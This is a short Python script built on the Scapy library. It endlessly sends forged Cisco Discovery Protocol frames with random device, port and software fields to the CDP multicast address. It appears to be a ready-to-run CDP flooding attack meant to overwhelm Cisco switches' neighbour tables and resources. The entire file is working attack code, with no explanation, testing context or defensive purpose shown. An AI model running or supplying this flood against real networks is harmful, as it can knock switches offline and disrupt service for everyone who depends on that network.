from scapy.all import *
from scapy.contrib.cdp import CDPv2_HDR, CDPMsgDeviceID, CDPMsgPortID, CDPMsgSoftwareVersion, CDPMsgPlatform
import random
import string

interface = "eth0"

def random_string(size=12):
    return ''.join(random.choice(string.ascii_letters) for _ in range(size))

while True:
    device_id = CDPMsgDeviceID(val=random_string(8))
    port_id = CDPMsgPortID(iface=random_string(6))
    software = CDPMsgSoftwareVersion(val=random_string(20))
    platform = CDPMsgPlatform(val="Cisco 3750")

    cdp = CDPv2_HDR(msg=[device_id, port_id, software, platform])

    frame = (
        Ether(dst="01:00:0c:cc:cc:cc") /
        LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
        SNAP(OUI=0x00000c, code=0x2000) /
        cdp
    )

    sendp(frame, iface=interface, inter=0.01, loop=0)
